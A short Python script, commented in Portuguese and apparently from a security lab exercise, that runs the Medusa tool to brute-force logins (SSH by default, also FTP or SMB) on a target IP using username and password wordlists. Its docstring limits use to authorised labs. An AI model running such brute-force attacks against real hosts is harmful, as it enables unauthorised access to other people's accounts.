#!/usr/bin/env python3
"""Automatiza um ataque de força bruta com Medusa contra um alvo local.

Uso:
    python3 scripts/bruteforce.py -H 192.168.56.101 -u wordlist/username -p wordlist/password

AVISO: use apenas em ambientes autorizados (laboratório/local).
"""

import argparse
import subprocess
import sys


def run_medusa(host, user_file, pass_file, service="ssh", port=None):
    cmd = ["medusa", "-h", host, "-U", user_file, "-P", pass_file, "-M", service]
    if port:
        cmd += ["-n", str(port)]
    print("[*] Executando:", " ".join(cmd))
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
    except FileNotFoundError:
        print("[!] Medusa não encontrado. Instale com: sudo apt install medusa")
        sys.exit(1)
    print(result.stdout)
    if result.returncode != 0 and result.stderr:
        print("[!] Erros:", result.stderr)
    return result.returncode


def main():
    parser = argparse.ArgumentParser(description="Brute force com Medusa")
    parser.add_argument("-H", "--host", required=True, help="IP do alvo (VM local)")
    parser.add_argument("-u", "--users", default="wordlist/username", help="Arquivo de usuários")
    parser.add_argument("-p", "--passwords", default="wordlist/password", help="Arquivo de senhas")
    parser.add_argument("-M", "--module", default="ssh", help="Módulo Medusa (ssh, ftp, smbnt...)")
    parser.add_argument("-n", "--port", type=int, help="Porta do serviço")
    args = parser.parse_args()

    run_medusa(args.host, args.users, args.passwords, args.module, args.port)


if __name__ == "__main__":
    main()
